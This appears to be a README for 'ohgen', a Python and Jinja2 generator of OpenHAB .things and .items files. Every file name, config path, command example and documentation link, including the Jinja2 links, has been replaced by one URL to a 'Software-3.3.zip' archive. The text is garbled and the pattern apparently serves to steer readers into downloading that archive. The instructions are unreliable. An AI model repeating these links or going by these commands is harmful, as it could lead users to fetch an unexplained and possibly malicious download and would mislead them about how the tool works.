...
A template-based OpenHAB .things and .items file generator written in Python using [Jinja2](https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip) template engine.
...
`ohgen` enables you to create a template for each type of device and then generate the actual .things and .items files from a list of devices stored in `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` file.
...
- Copy `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` to `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip`
- Copy the directory `sample-templates` to `templates`

For convenience, `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` will be used by default when no file is specified on the command line:
```
https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
```

To use a different file, specify it on the command line:
```
https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
```
...
```
https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip -o
```

## Config and Device List File: `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip`

The `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` file contains list of devices/things to be generated. For examples: see `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` and `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip`
...
settings:
  ...
  outputs:
    mydefaultoutput: 
      things-file: https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
      items-file: https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
      things-file-header: |+
...
The `settings:` section inside `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` consists of three areas:
...
- `templates:` # defines the list of template names
  This section is optional. By default, the templates will load from a subdirectory `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip`. The extension `.tpl` will be added to the template name. This section can be added to override the default output file for specific template(s), or if you want to store your templates in a different place or name.
  - `template1-name:` # the name of the template
    - `template-file:` (optional) path to the template-file, including the file name. This path can be an absolute path, or relative to https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip file. 
    
        When this setting is omitted, the default is set to "https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip" - where `template1-name` is the name of the template section above. 
...
- `outputs:` #The list of output file definitions. Multiple output files can be specified here, for example if you'd like to have a separate file for lights, switches, sensors, etc.
  - `output1-name:` 
    - `things-file:` path to the .things file, absolute or relative to this file (https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip). Example: https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
    - `items-file:` path to the .items file. Example: https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip
...
By default, template files are stored in `templates/` subdirectory, relative to the `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` file, however this can be overridden in the https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip file.
...
Variables from `https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip` for the device will be substituted in the template file. Each thing entry in the yaml file will be loaded as a dictionary, which can be used inside the template. For detailed information about the template syntax, see [Jinja2 Template Designer](https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip).
...
In addition to the [builtin filters from Jinja2](https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip), `ohgen` provides the following special filters:
...
Jinja2 has a feature to [include another template](https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip) and [import macros](https://github.com/jonathanloucks/ohgen/raw/refs/heads/master/sample-templates/Software-3.3.zip). This is supported by `ohgen` also. The path reference inside the template is relative to the template folder.